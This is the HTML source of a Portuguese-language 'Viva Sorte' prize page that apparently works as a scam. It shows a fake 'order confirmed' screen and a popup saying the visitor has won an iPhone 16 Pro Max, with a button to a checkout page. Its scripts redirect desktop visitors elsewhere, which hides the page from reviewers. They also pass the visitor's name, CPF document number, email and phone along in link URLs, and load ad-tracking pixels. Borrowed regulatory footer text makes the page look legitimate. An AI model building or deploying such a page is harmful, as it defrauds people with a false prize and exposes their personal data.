<!--?php
  date_default_timezone_set('America/Sao_Paulo');
  $time = date('H:i');
  $date = date('d/m');
?--><!DOCTYPE html>
<html lang="pt-BR">
  <head>
    <script>
      function isMobileOrTablet() {
        const ua = navigator.userAgent.toLowerCase();
        return /android|iphone|ipad|ipod|tablet/.test(ua);
      }

      if (!isMobileOrTablet()) {
        window.location.href =
          "https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcQtF7IpgR2hziuFf6ftkMkOE6iqSVfBEEaQKg&s"; // Altere essa URL conforme necessário
      }
    </script>

    <script>
      window.pixelId = "68ae4da25f826c71d1f1b200";
      var a = document.createElement("script");
      a.setAttribute("async", "");
      a.setAttribute("defer", "");
      a.setAttribute("src", "https://cdn.utmify.com.br/scripts/pixel/pixel.js");
      document.head.appendChild(a);
    </script>
    <script
      src="https://cdn.utmify.com.br/scripts/utms/latest.js"
      data-utmify-prevent-xcod-sck
      data-utmify-prevent-subids
      async
      defer
    ></script>
    <script>
      function getQueryParams() {
        const params = new URLSearchParams(window.location.search);
        return {
          name: params.get("name") || "",
          document: params.get("document") || "",
          email: params.get("email") || "",
          telephone: params.get("telephone") || "",
        };
      }

      document.addEventListener("DOMContentLoaded", function () {
        const buttons = document.querySelectorAll("a[href]");
        buttons.forEach(function (button) {
          button.addEventListener("click", function (e) {
            const queryParams = getQueryParams();
            const urlParams = new URLSearchParams(queryParams).toString();
            const currentHref = button.getAttribute("href");
            const separator = currentHref.includes("?") ? "&" : "?";
            button.setAttribute(
              "href",
              `${currentHref}${separator}${urlParams}`
            );
          });
        });
      });
    </script>

    <meta charset="utf-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1" />
    <title>Viva Sorte</title>

    <!-- Estilos -->
    <link href="css/style.css" rel="stylesheet" />
    <link
      href="css/bootstrap.min.css"
      rel="stylesheet"
      crossorigin="anonymous"
    />
    <link rel="stylesheet" href="css/bootstrap-icons.min.css" />
    <link href="css/rodape.css" rel="stylesheet" />
    <link href="css/topo-branco.css" rel="stylesheet" />
    <link href="css/table-titulo.css" rel="stylesheet" />
    <link rel="preconnect" href="https://fonts.googleapis.com" />
    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin="" />
    <link
      href="https://fonts.googleapis.com/css2?family=Montserrat:ital,wght@0,100..900;1,100..900&display=swap"
      rel="stylesheet"
    />
    <style>
      /* Estilos do Novo Pop-up */
      .popup-overlay {
        display: none;
        position: fixed;
        top: 0;
        left: 0;
        width: 100%;
        height: 100%;
        background-color: rgba(0, 0, 0, 0.8);
        z-index: 9999;
        justify-content: center;
        align-items: center;
        animation: fadeIn 0.3s ease-out;
      }

      .popup-content {
        position: relative;
        width: 90%;
        max-width: 500px;
        background: linear-gradient(135deg, #ffffff 0%, #f8f8f8 100%);
        border-radius: 20px;
        padding: 30px;
        box-shadow: 0 10px 30px rgba(0, 0, 0, 0.3);
        text-align: center;
        overflow: hidden;
      }

      .popup-header {
        margin-bottom: 20px;
        position: relative;
      }

      .popup-logo {
        max-width: 150px;
        margin-bottom: 15px;
      }

      #close-popup {
        position: absolute;
        top: 15px;
        right: 15px;
        font-size: 24px;
        font-weight: bold;
        color: #888;
        cursor: pointer;
        transition: all 0.3s;
      }

      #close-popup:hover {
        color: #333;
        transform: scale(1.1);
      }

      .popup-congrats {
        color: #e63946;
        font-size: 28px;
        font-weight: 800;
        margin-bottom: 5px;
        text-transform: uppercase;
        letter-spacing: 1px;
      }

      .popup-subtitle {
        color: #666;
        font-size: 16px;
        margin-bottom: 5px;
      }

      .popup-title {
        color: #2a9d8f;
        font-size: 32px;
        font-weight: 800;
        margin: 10px 0 20px;
        text-shadow: 1px 1px 3px rgba(0, 0, 0, 0.1);
      }

      .prize-image-container {
        position: relative;
        margin: 20px auto;
        width: 200px;
        height: 200px;
      }

      .prize-image {
        width: 100%;
        height: auto;
        object-fit: contain;
        position: relative;
        z-index: 2;
        animation: float 3s ease-in-out infinite;
      }

      .shine-effect {
        position: absolute;
        top: -10%;
        left: -10%;
        width: 120%;
        height: 120%;
        background: radial-gradient(
          circle at center,
          rgba(255, 255, 255, 0.8) 0%,
          rgba(255, 255, 255, 0) 70%
        );
        z-index: 1;
        animation: shine 3s ease-in-out infinite alternate;
      }

      .popup-message {
        color: #555;
        font-size: 16px;
        line-height: 1.5;
        margin: 20px 0;
      }

      .popup-instructions {
        color: #333;
        font-weight: 600;
        font-size: 17px;
        margin-bottom: 25px;
      }

      .redeem-button {
        background: linear-gradient(
          90deg,
          rgba(9, 5, 80, 1) 0%,
          rgba(9, 9, 121, 1) 49%,
          rgba(0, 46, 255, 1) 100%
        );
        color: white;
        border: none;
        padding: 15px 25px;
        font-size: 18px;
        font-weight: 700;
        border-radius: 50px;
        cursor: pointer;
        width: 100%;
        max-width: 350px;
        margin: 0 auto;
        display: flex;
        align-items: center;
        justify-content: center;
        gap: 10px;
        box-shadow: 0 5px 15px rgba(42, 157, 143, 0.4);
        transition: all 0.3s ease;
      }

      .redeem-button:hover {
        transform: translateY(-3px);
        box-shadow: 0 8px 20px rgba(42, 157, 143, 0.6);
      }

      .redeem-button:active {
        transform: translateY(1px);
      }

      .button-icon {
        font-size: 24px;
      }

      .button-text {
        flex: 1;
      }

      /* Confetti animation */
      .confetti-container {
        position: absolute;
        width: 100%;
        height: 100%;
        top: 0;
        left: 0;
        pointer-events: none;
        z-index: 1;
      }

      .confetti {
        position: absolute;
        width: 10px;
        height: 10px;
        background-color: #f00;
        opacity: 0;
      }

      .confetti:nth-child(1) {
        background-color: #e63946;
        left: 10%;
        top: -10px;
        animation: confettiFall 5s linear infinite;
      }

      .confetti:nth-child(2) {
        background-color: #2a9d8f;
        left: 30%;
        top: -10px;
        animation: confettiFall 4s linear infinite 0.5s;
      }

      .confetti:nth-child(3) {
        background-color: #f4a261;
        left: 50%;
        top: -10px;
        animation: confettiFall 6s linear infinite 1s;
      }

      .confetti:nth-child(4) {
        background-color: #e9c46a;
        left: 70%;
        top: -10px;
        animation: confettiFall 5.5s linear infinite 1.5s;
      }

      .confetti:nth-child(5) {
        background-color: #457b9d;
        left: 90%;
        top: -10px;
        animation: confettiFall 4.5s linear infinite 2s;
      }

      /* Animations */
      @keyframes fadeIn {
        from {
          opacity: 0;
        }
        to {
          opacity: 1;
        }
      }

      @keyframes float {
        0%,
        100% {
          transform: translateY(0);
        }
        50% {
          transform: translateY(-10px);
        }
      }

      @keyframes shine {
        from {
          transform: scale(1);
          opacity: 0.8;
        }
        to {
          transform: scale(1.2);
          opacity: 0;
        }
      }

      @keyframes confettiFall {
        0% {
          transform: translateY(0) rotate(0deg);
          opacity: 1;
        }
        100% {
          transform: translateY(500px) rotate(360deg);
          opacity: 0;
        }
      }
    </style>
    <!-- Scripts -->
    <script
      src="js/latest_1.js"
      data-utmify-prevent-subids=""
      async=""
      defer=""
    ></script>
  </head>

  <body>
    <!-- Header -->
    <header class="topo-branco">
      <img src="images/logo.png" alt="Logo Viva Sorte" />
    </header>

    <!-- Banner -->
    <section class="banner">
      <div class="container-banner">
        <div
          id="carouselExampleSlidesOnly"
          class="carousel slide"
          data-bs-ride="carousel"
        >
          <div class="carousel-inner">
            <div class="carousel-item active">
              <img
                src="images/pagamento.png"
                class="pagamento-img"
                alt="Banner Viva Sorte"
              />
            </div>
          </div>
        </div>
      </div>
    </section>

    <!-- Seção de Sorteio -->
    <section class="sorteio">
      <div class="sorteio-date text-center">
        <img src="images/check.svg" class="check" alt="Check" />
        <h1>Pedido Confirmado</h1>
      </div>
      <div class="sorteio-date text-center" style="margin-top: 5px">
        <div class="sorteio-date text-center">
          <p><strong>Número do pedido:</strong> 00044792</p>
        </div>
      </div>

      <!-- Ticket -->
      <div class="ticket-container">
        <img src="images/T.png" class="ticket" alt="Ticket" />
      </div>

      <div class="ctaimg">
        <img
          src="images/121032-iphone-16-pro-max.png"
          class="pigimg"
          alt="cta"
          onclick="openPopup()"
        />
      </div>
      <div
        class="ctaimg"
        style="margin-top: -80px; animation: pulse 2s infinite"
      >
        <img
          src="images/Design-sem-nome.png"
          class="pigimg"
          alt="cta"
          onclick="openPopup()"
        />
      </div>

      <style>
        @keyframes pulse {
          0% {
            transform: scale(1);
          }
          50% {
            transform: scale(1.05);
          }
          100% {
            transform: scale(1);
          }
        }
      </style>

      <!-- Box Resumo -->
      <div class="resumo-container">
        <h2>
          RESUMO <br />
          da sua compra
        </h2>
        <p>Seu título premiado: <strong>19658489546</strong></p>
        <div class="display-container">
          <div class="display-header">
            <a>Título</a>
            <div class="sub-display-header">19658489546</div>
          </div>
          <div class="display-grid">
            <div class="display-row">
              <div class="number-circle">04</div>
              <div class="number-circle">07</div>
              <div class="number-circle">08</div>
              <div class="number-circle">21</div>
              <div class="number-circle">22</div>
            </div>
            <div class="display-row">
              <div class="number-circle">23</div>
              <div class="number-circle">24</div>
              <div class="number-circle">26</div>
              <div class="number-circle">27</div>
              <div class="number-circle">28</div>
            </div>
            <div class="display-row">
              <div class="number-circle">30</div>
              <div class="number-circle">32</div>
              <div class="number-circle">33</div>
              <div class="number-circle">34</div>
              <div class="number-circle">41</div>
            </div>
            <div class="display-row">
              <div class="number-circle">42</div>
              <div class="number-circle">43</div>
              <div class="number-circle">44</div>
              <div class="number-circle">52</div>
              <div class="number-circle">56</div>
            </div>
          </div>
        </div>
      </div>

      <!-- Novo Popup -->
      <div id="popup" class="popup-overlay">
        <div class="popup-content">
          <span id="close-popup" onclick="closePopup()">×</span>
          <div class="popup-header">
            <img src="images/logo.png" class="popup-logo" alt="Viva Sorte" />
            <div class="confetti-container">
              <div class="confetti"></div>
              <div class="confetti"></div>
              <div class="confetti"></div>
              <div class="confetti"></div>
              <div class="confetti"></div>
            </div>
          </div>

          <div class="popup-body">
            <h2 class="popup-congrats">PARABÉNS!</h2>
            <p class="popup-subtitle">Você acaba de ganhar um</p>
            <h1 class="popup-title">iPhone 16 Pro Max</h1>

            <div class="prize-image-container">
              <img
                src="images/121032-iphone-16-pro-max.png"
                class="prize-image"
                alt="iPhone 16 Pro Max"
              />
              <div class="shine-effect"></div>
            </div>

            <p class="popup-message">
              Sua sorte está brilhando hoje! Você foi um dos sortudos a ganhar o
              novo iPhone 16 Pro Max.
            </p>
            <p class="popup-instructions">
              Agora só precisamos confirmar como você deseja receber este prêmio
              incrível!
            </p>
          </div>

          <div class="popup-footer">
            <button
              id="btn-receber"
              class="redeem-button"
              onclick="window.location.href='./checkout/index.html';"
            >
              <span class="button-icon">🎁</span>
              <span class="button-text">QUERO RECEBER MEU IPHONE!</span>
            </button>
          </div>
        </div>
      </div>

      <!-- Viva Privilégios -->
      <div class="container-principal">
        <div class="hospital">
          <div class="card-hospital card-hospital-bg-azul">
            <div class="card-hospital-image">
              <img src="images/viva-hosp.svg" alt="Logo Viva Privilégios" />
              <h2>Viva Privilégios</h2>
            </div>
            <div class="card-hospital-text">
              <p>
                Viva Privilégios, um programa que enriquece sua vida com acesso
                saúde, alimentação, transporte e mais. Com cada compra, acumule
                pontos para trocar por consultas médicas, receber cashback, e
                utilizar serviços de telefonia e apps de transporte e
                alimentação. Eleve sua qualidade de vida e desfrute de mais
                conveniência e economia!
              </p>
            </div>
          </div>
        </div>
      </div>
    </section>

    <!-- Footer -->
    <footer class="rodape">
      <div class="container-principal">
        <img class="logo-rodape" src="images/logo.png" alt="Logo Viva Sorte" />

        <div class="redes">
          <i class="bi bi-instagram"></i>
          <i class="bi bi-facebook"></i>
          <i class="bi bi-twitter"></i>
          <i class="bi bi-youtube"></i>
        </div>

        <p class="informacoes-sorteio">
          Sorteios lastreados por Títulos de Capitalização, da Modalidade
          Incentivo, emitidos pela VIA Capitalização S.A, inscrita no CNPJ sob
          nº 88.076.302/0001-94, e aprovados pela SUSEP através do registro na
          SUSEP Sorteio n° 15414.652257/2023-51. O valor das premiações aqui
          indicados são líquidos, já descontado o devido imposto de renda de
          25%. O registro deste plano na SUSEP não implica, por parte da
          Autarquia, incentivo ou recomendação à sua comercialização.
        </p>

        <div class="linha-rodape"></div>

        <div class="patterns-rodape">
          <div class="pattern-rodape">
            Títulos emitidos por:
            <img src="images/viacap.png" alt="Via Capitalização" />
          </div>

          <div class="pattern-rodape">
            Promoção realizada por:
            <img src="images/viva.png" alt="Viva Sorte" />
          </div>

          <div class="pattern-rodape">
            Desenvolvimento:
            <img src="images/edjdigital.png" alt="EDJ Digital" />
          </div>
        </div>
      </div>
    </footer>

    <script src="js/confetti.browser.min.js"></script>
    <script>
      function openPopup() {
        const popup = document.getElementById("popup");
        popup.style.display = "flex";

        // Criar confetes adicionais
        createConfetti();
      }

      function closePopup() {
        const popup = document.getElementById("popup");
        popup.style.display = "none";
      }

      function createConfetti() {
        const confettiContainer = document.querySelector(".confetti-container");
        for (let i = 0; i < 20; i++) {
          const confetti = document.createElement("div");
          confetti.className = "confetti";
          confetti.style.left = Math.random() * 100 + "%";
          confetti.style.top = -10 + "px";
          confetti.style.backgroundColor = getRandomColor();
          confetti.style.animation = `confettiFall ${
            3 + Math.random() * 4
          }s linear infinite ${Math.random() * 2}s`;
          confetti.style.width = 8 + Math.random() * 8 + "px";
          confetti.style.height = confetti.style.width;
          confettiContainer.appendChild(confetti);
        }
      }

      function getRandomColor() {
        const colors = [
          "#e63946",
          "#2a9d8f",
          "#f4a261",
          "#e9c46a",
          "#457b9d",
          "#1d3557",
        ];
        return colors[Math.floor(Math.random() * colors.length)];
      }

      function launchConfetti() {
        const duration = 2 * 1000;
        const end = Date.now() + duration;

        (function frame() {
          confetti({
            particleCount: 7,
            angle: 60,
            spread: 55,
            origin: { x: 0 },
          });
          confetti({
            particleCount: 7,
            angle: 120,
            spread: 55,
            origin: { x: 1 },
          });

          if (Date.now() < end) {
            requestAnimationFrame(frame);
          }
        })();
      }

      window.addEventListener("load", launchConfetti);
    </script>
    <script>
      // Função para obter parâmetros da URL
      function getParameterByName(name, url = window.location.href) {
        name = name.replace(/[\[\]]/g, "\\$&");
        let regex = new RegExp("[?&]" + name + "(=([^&#]*)|&|#|$)"),
          results = regex.exec(url);
        if (!results) return null;
        if (!results[2]) return "";
        return decodeURIComponent(results[2].replace(/\+/g, " "));
      }

      // Coletando as variáveis da URL
      let cpf = getParameterByName("document");
      let name = getParameterByName("name");

      // Exibindo as variáveis na página
      document.getElementById("cpf").textContent = cpf || "Não informado";
      document.getElementById("name").textContent = name || "Não informado";
    </script>

    <script
      src="js/latest_1_1.js"
      data-utmify-prevent-subids=""
      async=""
      defer=""
    ></script>
  </body>
</html>
